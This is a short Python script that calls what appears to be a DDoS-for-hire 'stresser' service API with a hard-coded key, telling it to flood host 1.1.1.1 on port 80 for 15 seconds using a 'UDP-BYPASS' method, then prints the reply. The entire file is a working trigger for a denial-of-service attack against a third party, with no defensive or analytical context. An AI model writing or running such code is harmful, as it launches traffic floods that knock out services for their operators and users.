import os
import requests

url = "https://flurystress.st/api?key=92f58a0b49a035db&host=1.1.1.1&port=80&time=15&method=UDP-BYPASS"
response = requests.get(url, timeout=30)
print(f"Status: {response.status_code}")
print(f"Body: {response.text}")
